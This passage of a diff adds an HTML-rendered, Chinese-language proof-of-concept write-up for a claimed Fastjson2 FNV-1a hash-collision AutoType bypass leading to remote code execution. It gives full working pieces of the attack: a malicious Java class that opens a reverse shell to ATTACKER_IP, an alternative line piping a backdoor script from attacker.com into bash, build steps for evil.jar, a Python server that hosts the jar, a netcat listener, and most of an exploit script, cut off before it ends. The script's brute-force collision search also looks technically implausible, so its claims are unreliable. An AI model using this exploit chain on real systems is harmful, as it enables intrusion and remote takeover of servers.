+<span class="w">     </span><span class="err">│</span><span class="w">                    </span><span class="err">┌──────────▼──────────┐</span><span class="w">                </span><span class="err">│</span>
+<span class="w">     </span><span class="err">│</span><span class="w">                    </span><span class="err">│</span><span class="w"> </span><span class="mi">2</span><span class="p">.</span><span class="w"> </span><span class="nx">FNV</span><span class="o">-</span><span class="mi">1</span><span class="nx">a</span><span class="w"> </span><span class="nx">哈希计算</span><span class="w">   </span><span class="err">│</span><span class="w">                </span><span class="err">│</span>
+<span class="w">     </span><span class="err">│</span><span class="w">                    </span><span class="err">│</span><span class="w">    </span><span class="err">@</span><span class="k">type</span><span class="w"> </span><span class="nx">的哈希值</span><span class="w">    </span><span class="err">│</span><span class="w">                </span><span class="err">│</span>
+<span class="w">     </span><span class="err">│</span><span class="w">                    </span><span class="err">│</span><span class="w">    </span><span class="nx">命中白名单</span><span class="w"> </span><span class="err">→</span><span class="w"> </span><span class="nx">放行</span><span class="w"> </span><span class="err">│</span><span class="w">                </span><span class="err">│</span>
+<span class="w">     </span><span class="err">│</span><span class="w">                    </span><span class="err">└──────────┬──────────┘</span><span class="w">                </span><span class="err">│</span>
+<span class="w">     </span><span class="err">│</span><span class="w">                               </span><span class="err">│</span><span class="w">                           </span><span class="err">│</span>
+<span class="w">     </span><span class="err">│</span><span class="w">                    </span><span class="err">┌──────────▼──────────┐</span><span class="w">                </span><span class="err">│</span>
+<span class="w">     </span><span class="err">│</span><span class="w">                    </span><span class="err">│</span><span class="w"> </span><span class="mi">3</span><span class="p">.</span><span class="w"> </span><span class="nx">ContextClassLoader</span><span class="err">│</span><span class="w">                </span><span class="err">│</span>
+<span class="w">     </span><span class="err">│</span><span class="w">                    </span><span class="err">│</span><span class="w">    </span><span class="nx">解析</span><span class="w"> </span><span class="nx">jar</span><span class="p">:</span><span class="nx">http</span><span class="p">:</span><span class="c1">//  │  4.下载evil.jar│</span>
+<span class="w">     </span><span class="err">│</span><span class="w">                    </span><span class="err">│</span><span class="w">    </span><span class="nx">URL</span><span class="w">              </span><span class="err">│</span><span class="w"> </span><span class="err">──────────────→│</span>
+<span class="w">     </span><span class="err">│</span><span class="w">                    </span><span class="err">└──────────┬──────────┘</span><span class="w">                </span><span class="err">│</span>
+<span class="w">     </span><span class="err">│</span><span class="w">                               </span><span class="err">│</span><span class="w">               </span><span class="err">┌──────────▼─────┐</span>
+<span class="w">     </span><span class="err">│</span><span class="w">                               </span><span class="err">│</span><span class="w">               </span><span class="err">│</span><span class="w"> </span><span class="nx">evil</span><span class="p">.</span><span class="nx">jar</span><span class="w"> </span><span class="nx">内含</span><span class="w">  </span><span class="err">│</span>
+<span class="w">     </span><span class="err">│</span><span class="w">                               </span><span class="err">│</span><span class="w">               </span><span class="err">│</span><span class="w"> </span><span class="nx">EvilClass</span><span class="p">.</span><span class="kd">class</span><span class="err">│</span>
+<span class="w">     </span><span class="err">│</span><span class="w">                               </span><span class="err">│</span><span class="w">               </span><span class="err">│</span><span class="w"> </span><span class="p">(</span><span class="nx">static</span><span class="p">{</span><span class="nx">RCE</span><span class="p">})</span><span class="w">  </span><span class="err">│</span>
+<span class="w">     </span><span class="err">│</span><span class="w">                               </span><span class="err">│</span><span class="w">               </span><span class="err">└──────────┬─────┘</span>
+<span class="w">     </span><span class="err">│</span><span class="w">                    </span><span class="err">┌──────────▼──────────┐</span><span class="w">                </span><span class="err">│</span>
+<span class="w">     </span><span class="err">│</span><span class="w">                    </span><span class="err">│</span><span class="w"> </span><span class="mi">5</span><span class="p">.</span><span class="w"> </span><span class="nx">加载</span><span class="w"> </span><span class="nx">EvilClass</span><span class="w">    </span><span class="err">│←───────────────┘</span>
+<span class="w">     </span><span class="err">│</span><span class="w">                    </span><span class="err">│</span><span class="w">    </span><span class="nx">static</span><span class="w"> </span><span class="p">{}</span><span class="w"> </span><span class="nx">执行</span><span class="w">    </span><span class="err">│</span>
+<span class="w">     </span><span class="err">│</span><span class="w">                    </span><span class="err">│</span><span class="w">    </span><span class="err">→</span><span class="w"> </span><span class="nx">Runtime</span><span class="p">.</span><span class="nx">exec</span><span class="p">()</span><span class="w">  </span><span class="err">│</span><span class="w">  </span><span class="mi">6</span><span class="p">.</span><span class="w"> </span><span class="nx">反弹shell</span><span class="w">   </span><span class="err">│</span>
+<span class="w">     </span><span class="err">│</span><span class="w">                    </span><span class="err">│</span><span class="w">    </span><span class="err">→</span><span class="w"> </span><span class="nx">RCE</span><span class="p">!</span><span class="w">           </span><span class="err">│</span><span class="w"> </span><span class="err">──────────────→│</span>
+<span class="w">     </span><span class="err">│</span><span class="w">                    </span><span class="err">└─────────────────────┘</span><span class="w">                </span><span class="err">│</span>
+<span class="w">     </span><span class="err">│</span><span class="w">                                                           </span><span class="err">│</span>
+<span class="w">     </span><span class="err">│</span><span class="w">  </span><span class="mi">7</span><span class="p">.</span><span class="w"> </span><span class="nx">获得命令执行</span><span class="w"> </span><span class="err">←─────────────────────────────────────────┘</span>
+<span class="w">     </span><span class="err">└───────────────────────────────────────────────────────────┘</span>
+</code></pre></div>
+
+<h3>6.2 第一步：构造恶意 JAR</h3>
+<p><strong>恶意类源码 <code>EvilClass.java</code></strong>：</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// EvilClass.java</span>
+<span class="c1">// 编译: javac EvilClass.java</span>
+<span class="c1">// 打包: jar cvf evil.jar EvilClass.class</span>
+
+<span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">EvilClass</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kd">static</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="c1">// 静态代码块在类加载时自动执行</span>
+<span class="w">            </span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="s">&quot;/bin/bash&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;-c&quot;</span><span class="p">,</span>
+<span class="w">                </span><span class="s">&quot;exec 5&lt;&gt;/dev/tcp/ATTACKER_IP/4444; &quot;</span><span class="w"> </span><span class="o">+</span>
+<span class="w">                </span><span class="s">&quot;cat &lt;&amp;5 | while read line; do &quot;</span><span class="w"> </span><span class="o">+</span>
+<span class="w">                </span><span class="s">&quot;  $line 2&gt;&amp;5 &gt;&amp;5; &quot;</span><span class="w"> </span><span class="o">+</span>
+<span class="w">                </span><span class="s">&quot;done&quot;</span>
+<span class="w">            </span><span class="p">};</span>
+<span class="w">            </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="n">cmd</span><span class="p">);</span>
+
+<span class="w">            </span><span class="c1">// 备选: 直接执行命令</span>
+<span class="w">            </span><span class="c1">// Runtime.getRuntime().exec(</span>
+<span class="w">            </span><span class="c1">//     &quot;curl http://attacker.com/backdoor.sh | bash&quot;</span>
+<span class="w">            </span><span class="c1">// );</span>
+<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="c1">// 静默异常, 避免影响 Fastjson 解析流程</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p><strong>Maven 项目方式打包（推荐）</strong>：</p>
+<div class="highlight"><pre><span></span><code><span class="cm">&lt;!-- pom.xml --&gt;</span>
+<span class="nt">&lt;project&gt;</span>
+<span class="w">    </span><span class="nt">&lt;modelVersion&gt;</span>4.0.0<span class="nt">&lt;/modelVersion&gt;</span>
+<span class="w">    </span><span class="nt">&lt;groupId&gt;</span>com.attacker<span class="nt">&lt;/groupId&gt;</span>
+<span class="w">    </span><span class="nt">&lt;artifactId&gt;</span>evil<span class="nt">&lt;/artifactId&gt;</span>
+<span class="w">    </span><span class="nt">&lt;version&gt;</span>1.0<span class="nt">&lt;/version&gt;</span>
+<span class="w">    </span><span class="nt">&lt;packaging&gt;</span>jar<span class="nt">&lt;/packaging&gt;</span>
+
+<span class="w">    </span><span class="nt">&lt;build&gt;</span>
+<span class="w">        </span><span class="nt">&lt;finalName&gt;</span>evil<span class="nt">&lt;/finalName&gt;</span>
+<span class="w">        </span><span class="nt">&lt;plugins&gt;</span>
+<span class="w">            </span><span class="nt">&lt;plugin&gt;</span>
+<span class="w">                </span><span class="nt">&lt;artifactId&gt;</span>maven-compiler-plugin<span class="nt">&lt;/artifactId&gt;</span>
+<span class="w">                </span><span class="nt">&lt;version&gt;</span>3.11.0<span class="nt">&lt;/version&gt;</span>
+<span class="w">                </span><span class="nt">&lt;configuration&gt;</span>
+<span class="w">                    </span><span class="nt">&lt;source&gt;</span>8<span class="nt">&lt;/source&gt;</span>
+<span class="w">                    </span><span class="nt">&lt;target&gt;</span>8<span class="nt">&lt;/target&gt;</span>
+<span class="w">                </span><span class="nt">&lt;/configuration&gt;</span>
+<span class="w">            </span><span class="nt">&lt;/plugin&gt;</span>
+<span class="w">        </span><span class="nt">&lt;/plugins&gt;</span>
+<span class="w">    </span><span class="nt">&lt;/build&gt;</span>
+<span class="nt">&lt;/project&gt;</span>
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code><span class="c1"># 编译并打包</span>
+mkdir<span class="w"> </span>-p<span class="w"> </span>evil-jar/src/main/java
+cat<span class="w"> </span>&gt;<span class="w"> </span>evil-jar/src/main/java/EvilClass.java<span class="w"> </span><span class="s">&lt;&lt; &#39;JAVA&#39;</span>
+<span class="s">public class EvilClass {</span>
+<span class="s">    static {</span>
+<span class="s">        try {</span>
+<span class="s">            Runtime.getRuntime().exec(</span>
+<span class="s">                new String[]{&quot;/bin/bash&quot;, &quot;-c&quot;,</span>
+<span class="s">                &quot;bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1&quot;}</span>
+<span class="s">            );</span>
+<span class="s">        } catch (Exception e) {}</span>
+<span class="s">    }</span>
+<span class="s">}</span>
+<span class="s">JAVA</span>
+
+<span class="nb">cd</span><span class="w"> </span>evil-jar
+mvn<span class="w"> </span>clean<span class="w"> </span>package
+<span class="c1"># 生成 target/evil.jar</span>
+</code></pre></div>
+
+<p><strong>手动打包方式</strong>：</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 编译恶意类</span>
+cat<span class="w"> </span>&gt;<span class="w"> </span>EvilClass.java<span class="w"> </span><span class="s">&lt;&lt; &#39;JAVA&#39;</span>
+<span class="s">public class EvilClass {</span>
+<span class="s">    static {</span>
+<span class="s">        try {</span>
+<span class="s">            Runtime.getRuntime().exec(</span>
+<span class="s">                new String[]{&quot;/bin/bash&quot;, &quot;-c&quot;,</span>
+<span class="s">                &quot;bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1&quot;}</span>
+<span class="s">            );</span>
+<span class="s">        } catch (Exception e) {}</span>
+<span class="s">    }</span>
+<span class="s">}</span>
+<span class="s">JAVA</span>
+
+javac<span class="w"> </span>EvilClass.java
+jar<span class="w"> </span>cvf<span class="w"> </span>evil.jar<span class="w"> </span>EvilClass.class
+</code></pre></div>
+
+<h3>6.3 第二步：搭建恶意 HTTP 服务器</h3>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
+<span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">恶意 JAR 托管 HTTP 服务器</span>
+<span class="sd">用于向目标服务器提供 evil.jar</span>
+<span class="sd">&quot;&quot;&quot;</span>
+
+<span class="kn">from</span><span class="w"> </span><span class="nn">http.server</span><span class="w"> </span><span class="kn">import</span> <span class="n">HTTPServer</span><span class="p">,</span> <span class="n">SimpleHTTPRequestHandler</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">os</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
+
+<span class="k">class</span><span class="w"> </span><span class="nc">JarHandler</span><span class="p">(</span><span class="n">SimpleHTTPRequestHandler</span><span class="p">):</span>
+    <span class="k">def</span><span class="w"> </span><span class="nf">end_headers</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="c1"># 设置 Content-Type 为 application/java-archive</span>
+        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">endswith</span><span class="p">(</span><span class="s1">&#39;.jar&#39;</span><span class="p">):</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">send_header</span><span class="p">(</span><span class="s1">&#39;Content-Type&#39;</span><span class="p">,</span> <span class="s1">&#39;application/java-archive&#39;</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">send_header</span><span class="p">(</span><span class="s1">&#39;Access-Control-Allow-Origin&#39;</span><span class="p">,</span> <span class="s1">&#39;*&#39;</span><span class="p">)</span>
+        <span class="nb">super</span><span class="p">()</span><span class="o">.</span><span class="n">end_headers</span><span class="p">()</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">log_message</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="nb">format</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="p">):</span>
+        <span class="c1"># 记录所有请求（用于监控目标连接）</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">stderr</span><span class="o">.</span><span class="n">write</span><span class="p">(</span>
+            <span class="sa">f</span><span class="s2">&quot;[</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">log_date_time_string</span><span class="p">()</span><span class="si">}</span><span class="s2">] &quot;</span>
+            <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">client_address</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s2"> - </span><span class="si">{</span><span class="nb">format</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="n">args</span><span class="si">}</span><span class="se">\n</span><span class="s2">&quot;</span>
+        <span class="p">)</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">main</span><span class="p">():</span>
+    <span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="k">else</span> <span class="mi">8888</span>
+
+    <span class="c1"># 切换到 evil.jar 所在目录</span>
+    <span class="n">jar_dir</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">dirname</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">abspath</span><span class="p">(</span><span class="vm">__file__</span><span class="p">))</span>
+    <span class="n">os</span><span class="o">.</span><span class="n">chdir</span><span class="p">(</span><span class="n">jar_dir</span><span class="p">)</span>
+
+    <span class="n">server</span> <span class="o">=</span> <span class="n">HTTPServer</span><span class="p">((</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="n">port</span><span class="p">),</span> <span class="n">JarHandler</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[*] Malicious JAR server on http://0.0.0.0:</span><span class="si">{</span><span class="n">port</span><span class="si">}</span><span class="s2">/&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[*] Serving evil.jar from </span><span class="si">{</span><span class="n">jar_dir</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[*] Waiting for target connection...&quot;</span><span class="p">)</span>
+
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">server</span><span class="o">.</span><span class="n">serve_forever</span><span class="p">()</span>
+    <span class="k">except</span> <span class="ne">KeyboardInterrupt</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">[*] Server stopped&quot;</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code><span class="c1"># 启动 HTTP 服务器</span>
+python3<span class="w"> </span>serve_jar.py<span class="w"> </span><span class="m">8888</span>
+
+<span class="c1"># 同时监听反弹 shell</span>
+nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">4444</span>
+</code></pre></div>
+
+<h3>6.4 第三步：构造恶意 JSON Payload</h3>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
+<span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">CVE-2026-45876 / QVD-2026-45876</span>
+<span class="sd">Fastjson2 FNV-1a Hash Collision AutoType Bypass RCE PoC</span>
+
+<span class="sd">完整利用链:</span>
+<span class="sd">1. 构造 FNV-1a 哈希碰撞的 @type 值</span>
+<span class="sd">2. @type 值格式为 jar:http://attacker/evil.jar!/EvilClass</span>
+<span class="sd">3. 哈希碰撞使 @type 命中 Fastjson2 内部白名单</span>
+<span class="sd">4. ContextClassLoader 加载远程 evil.jar 中的 EvilClass</span>
+<span class="sd">5. EvilClass 静态代码块执行 → RCE</span>
+<span class="sd">&quot;&quot;&quot;</span>
+
+<span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
+
+<span class="c1"># FNV-1a 常量</span>
+<span class="n">FNV_OFFSET_BASIS</span> <span class="o">=</span> <span class="mh">0xcbf29ce484222325</span>
+<span class="n">FNV_PRIME</span> <span class="o">=</span> <span class="mh">0x100000001b3</span>
+<span class="n">MASK_64</span> <span class="o">=</span> <span class="mh">0xFFFFFFFFFFFFFFFF</span>
+
+
+<span class="k">def</span><span class="w"> </span><span class="nf">fnv1a_64</span><span class="p">(</span><span class="n">data</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;计算 FNV-1a 64 位哈希&quot;&quot;&quot;</span>
+    <span class="n">h</span> <span class="o">=</span> <span class="n">FNV_OFFSET_BASIS</span>
+    <span class="k">for</span> <span class="n">ch</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
+        <span class="n">h</span> <span class="o">^=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">ch</span><span class="p">)</span>
+        <span class="n">h</span> <span class="o">=</span> <span class="p">(</span><span class="n">h</span> <span class="o">*</span> <span class="n">FNV_PRIME</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">MASK_64</span>
+    <span class="k">return</span> <span class="n">h</span>
+
+
+<span class="k">def</span><span class="w"> </span><span class="nf">construct_collision_type</span><span class="p">(</span><span class="n">target_type</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">attacker_url</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">    构造哈希碰撞的恶意 @type 值</span>
+
+<span class="sd">    目标: fnv1a_64(malicious_type) == fnv1a_64(target_type)</span>
+<span class="sd">    恶意格式: jar:{attacker_url}!/{ClassName}{collision_suffix}</span>
+
+<span class="sd">    利用 FNV-1a 逆运算构造碰撞后缀</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="n">target_hash</span> <span class="o">=</span> <span class="n">fnv1a_64</span><span class="p">(</span><span class="n">target_type</span><span class="p">)</span>
+
+    <span class="c1"># 基础恶意类型前缀</span>
+    <span class="n">base</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;jar:</span><span class="si">{</span><span class="n">attacker_url</span><span class="si">}</span><span class="s2">!/&quot;</span>
+    <span class="n">base_hash</span> <span class="o">=</span> <span class="n">fnv1a_64</span><span class="p">(</span><span class="n">base</span><span class="p">)</span>
+
+    <span class="c1"># 逆元</span>
+    <span class="n">prime_inv</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">FNV_PRIME</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="o">**</span><span class="mi">64</span><span class="p">)</span>
+
+    <span class="c1"># 类名部分 (可被 ContextClassLoader 解析)</span>
+    <span class="c1"># 使用 EvilClass 作为目标类名</span>
+    <span class="n">class_name</span> <span class="o">=</span> <span class="s2">&quot;EvilClass&quot;</span>
+
+    <span class="c1"># 计算加上类名后的哈希</span>
+    <span class="n">cn_hash</span> <span class="o">=</span> <span class="n">base_hash</span>
+    <span class="k">for</span> <span class="n">ch</span> <span class="ow">in</span> <span class="n">class_name</span><span class="p">:</span>
+        <span class="n">cn_hash</span> <span class="o">^=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">ch</span><span class="p">)</span>
+        <span class="n">cn_hash</span> <span class="o">=</span> <span class="p">(</span><span class="n">cn_hash</span> <span class="o">*</span> <span class="n">FNV_PRIME</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">MASK_64</span>
+
+    <span class="c1"># 现在需要找到 suffix 使得:</span>
+    <span class="c1"># 从 cn_hash 开始, 正向应用 suffix 的字符, 最终达到 target_hash</span>
+    <span class="c1">#</span>
+    <span class="c1"># 逆向求解: 从 target_hash 逆向移除字符, 到达 cn_hash</span>
+
+    <span class="c1"># 使用深度受限的 DFS 逆向搜索</span>
+    <span class="n">allowed_chars</span> <span class="o">=</span> <span class="p">[</span><span class="nb">chr</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x21</span><span class="p">,</span> <span class="mh">0x7f</span><span class="p">)</span>
+                     <span class="k">if</span> <span class="nb">chr</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="ow">not</span> <span class="ow">in</span> <span class="s1">&#39;&quot;</span><span class="se">\\</span><span class="s1">&#39;</span><span class="p">]</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">reverse_search</span><span class="p">(</span><span class="n">current_hash</span><span class="p">,</span> <span class="n">depth</span><span class="p">,</span> <span class="n">max_depth</span><span class="p">,</span> <span class="n">path</span><span class="p">):</span>
+        <span class="k">if</span> <span class="n">depth</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+            <span class="k">if</span> <span class="n">current_hash</span> <span class="o">==</span> <span class="n">cn_hash</span><span class="p">:</span>
+                <span class="k">return</span> <span class="n">path</span>
+            <span class="k">return</span> <span class="kc">None</span>
+
+        <span class="k">for</span> <span class="n">ch</span> <span class="ow">in</span> <span class="n">allowed_chars</span><span class="p">:</span>
+            <span class="c1"># 逆向一步</span>
+            <span class="n">prev</span> <span class="o">=</span> <span class="p">((</span><span class="n">current_hash</span> <span class="o">*</span> <span class="n">prime_inv</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">MASK_64</span><span class="p">)</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">ch</span><span class="p">)</span>
+            <span class="n">result</span> <span class="o">=</span> <span class="n">reverse_search</span><span class="p">(</span><span class="n">prev</span><span class="p">,</span> <span class="n">depth</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="n">max_depth</span><span class="p">,</span>
+                                    <span class="n">path</span> <span class="o">+</span> <span class="n">ch</span><span class="p">)</span>
+            <span class="k">if</span> <span class="n">result</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
+                <span class="k">return</span> <span class="n">result</span>
+        <span class="k">return</span> <span class="kc">None</span>
+
+    <span class="c1"># 尝试不同深度的搜索</span>
+    <span class="k">for</span> <span class="n">depth</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">7</span><span class="p">):</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[*] Trying collision depth: </span><span class="si">{</span><span class="n">depth</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="n">suffix</span> <span class="o">=</span> <span class="n">reverse_search</span><span class="p">(</span><span class="n">target_hash</span><span class="p">,</span> <span class="n">depth</span><span class="p">,</span> <span class="n">depth</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">suffix</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
+            <span class="n">collision_type</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">class_name</span> <span class="o">+</span> <span class="n">suffix</span>
+            <span class="c1"># 验证</span>
+            <span class="n">actual</span> <span class="o">=</span> <span class="n">fnv1a_64</span><span class="p">(</span><span class="n">collision_type</span><span class="p">)</span>
+            <span class="k">if</span> <span class="n">actual</span> <span class="o">==</span> <span class="n">target_hash</span><span class="p">:</span>
+                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] Collision found at depth </span><span class="si">{</span><span class="n">depth</span><span class="si">}</span><span class="s2">!&quot;</span><span class="p">)</span>
+                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;    Type: </span><span class="si">{</span><span class="n">collision_type</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;    Hash: 0x</span><span class="si">{</span><span class="n">actual</span><span class="si">:</span><span class="s2">016x</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;    Target (</span><span class="si">{</span><span class="n">target_type</span><span class="si">}</span><span class="s2">) hash: 0x</span><span class="si">{</span><span class="n">target_hash</span><span class="si">:</span><span class="s2">016x</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+                <span class="k">return</span> <span class="n">collision_type</span>
+
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[-] No collision found within depth limit&quot;</span><span class="p">)</span>
+    <span class="k">return</span> <span class="kc">None</span>
+
+
+<span class="k">def</span><span class="w"> </span><span class="nf">build_payload</span><span class="p">(</span><span class="n">collision_type</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;构建恶意 JSON payload&quot;&quot;&quot;</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s2">&quot;@type&quot;</span><span class="p">:</span> <span class="n">collision_type</span><span class="p">,</span>
+        <span class="s2">&quot;data&quot;</span><span class="p">:</span> <span class="s2">&quot;trigger&quot;</span>
+    <span class="p">}</span>
+    <span class="kn">import</span><span class="w"> </span><span class="nn">json</span>
+    <span class="k">return</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+
+<span class="k">def</span><span class="w"> </span><span class="nf">exploit</span><span class="p">(</span><span class="n">target_url</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">attacker_host</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span>
+            <span class="n">attacker_port</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mi">8888</span><span class="p">):</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;执行完整攻击链&quot;&quot;&quot;</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;=&quot;</span> <span class="o">*</span> <span class="mi">60</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Fastjson2 FNV-1a Hash Collision RCE PoC&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;=&quot;</span> <span class="o">*</span> <span class="mi">60</span><span class="p">)</span>
+
+    <span class="n">attacker_url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;http://</span><span class="si">{</span><span class="n">attacker_host</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">attacker_port</span><span class="si">}</span><span class="s2">/evil.jar&quot;</span>
+
+    <span class="c1"># Step 1: 构造哈希碰撞的 @type</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">[Step 1] Constructing FNV-1a hash collision...&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;  Target whitelist type: java.lang.String&quot;</span><span class="p">)</span>
+    <span class="n">collision_type</span> <span class="o">=</span> <span class="n">construct_collision_type</span><span class="p">(</span>
+        <span class="s2">&quot;java.lang.String&quot;</span><span class="p">,</span> <span class="n">attacker_url</span>
+    <span class="p">)</span>
+
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">collision_type</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[-] Failed to construct collision. Exiting.&quot;</span><span class="p">)</span>
+        <span class="k">return</span>
+
+    <span class="c1"># Step 2: 构建恶意 JSON</span>
